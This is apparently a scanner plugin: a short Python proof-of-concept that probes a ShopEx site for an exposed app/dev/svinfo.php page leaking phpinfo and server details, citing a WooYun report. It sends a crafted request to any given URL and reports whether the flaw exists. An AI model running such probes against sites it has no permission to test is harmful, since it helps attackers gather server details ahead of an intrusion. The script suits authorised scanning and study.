#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: shopex敏感信息泄露
referer: http://www.wooyun.org/bugs/wooyun-2010-0100121
author: Lucifer
description: 路径 app/dev/svinfo.php,打开后可看到服务器测评信息及phpinfo等相关敏感信息。
'''
import sys
import requests
import warnings
def run(url):
        result = ['shopex敏感信息泄露','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
        }
        payload = "/app/dev/svinfo.php?phpinfo=true"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)

            if r"Configuration File (php.ini) Path" in req.text:
                result[2]=  '存在'
                result[1] = vulnurl
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
